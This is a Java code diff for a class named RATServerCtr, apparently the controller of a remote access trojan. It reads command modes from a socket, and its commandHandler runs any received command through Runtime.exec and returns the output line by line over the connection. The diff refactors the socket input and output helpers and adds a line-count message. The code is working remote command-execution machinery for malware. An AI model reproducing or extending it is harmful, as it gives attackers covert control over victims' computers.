@@ -53,7 +53,7 @@ public class RATServerCtr {
     public void execute (Socket s) {
         try {
             sendResult("ok");
-            String mode = getInput(s);
+            String mode = getInput();
             new RATServerView().showMessage(mode);
             switch (mode) {
                 case "Pic":
@@ -80,34 +80,46 @@ public class RATServerCtr {
         }
     }
     
-    public String getInput(Socket s) throws IOException {
+    public String getInput() throws IOException {
         InputStream ips = s.getInputStream();
         DataInputStream dis = new DataInputStream(ips);
         String input = dis.readUTF();
         return input;
     }
     
-    public void CommandRes(String res) {
-        try {
-            OutputStream ops = s.getOutputStream();
-            DataOutputStream dos = new DataOutputStream(ops);
-            dos.writeUTF(res);
-            dos.flush();
-        } catch (Exception e) {
-        }
+    public void CommandRes(String res) throws IOException {
+        OutputStream ops = s.getOutputStream();
+        DataOutputStream dos = new DataOutputStream(ops);
+        dos.writeUTF(res);
+        System.out.println(res);
+        dos.flush();
+    }
+    
+    public void CommandResLenght(int n) throws IOException {
+        String l = Integer.toString(n);
+        OutputStream ops = s.getOutputStream();
+        DataOutputStream dos = new DataOutputStream(ops);
+        dos.writeUTF(l);
+        System.out.println(l);
+        dos.flush();
     }
     
     public void commandHandler(String command) throws IOException {
         String c = command;
         try {
-            String line = null;
+            ArrayList<String> ar = new ArrayList<String>();
+            String line;
             Process proc = Runtime.getRuntime().exec(c);
             BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
             while((line = input.readLine()) != null) {
-                CommandRes(Arrays.toString(line.split("\s+")));
-                System.out.println(Arrays.toString(line.split("\s+")));
+                ar.add(line);   
             }
+            //System.out.println(Arrays.toString(line.split("\s+"))); 
             input.close();
+            CommandResLenght(ar.size());
+            for(int i = 0; i < ar.size(); i++) {
+                CommandRes(ar.get(i));
+            }
         } catch (Exception e) {
             e.printStackTrace();
         }
